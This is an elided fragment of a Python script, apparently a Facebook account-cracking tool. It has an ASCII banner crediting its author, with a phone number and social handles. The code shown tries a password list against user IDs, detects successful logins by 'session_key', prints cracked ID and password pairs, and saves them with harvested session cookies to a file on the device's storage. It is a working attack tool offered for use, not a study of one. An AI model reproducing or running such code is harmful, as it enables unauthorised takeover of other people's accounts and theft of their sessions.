...
Y8888P' Y888888P Y88888P YP   YP Y88888P {BLUE}X {RED}CHUZA {WHITE}

\t[×] Developed By Bilal Ahmed{EXTRA} (BILLU)
{WHITE}[•] AUTHOR       : BILAL AHMED
{WHITE}[•] STYLE         : NO STYLE NO ATTITUDE
{WHITE}[•] WhatsApp     :   +923190857715
[•] FaceBook     :   TRICKER MR BILAL
[•] Version      :   {BLUE}0.1
{WHITE}[•] YouTube      :   MASTER TRICKER

{WHITE}================================================
   \33[37;41m\t ASSALAM-O-ALIKUM \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-BILAL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/bilal-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
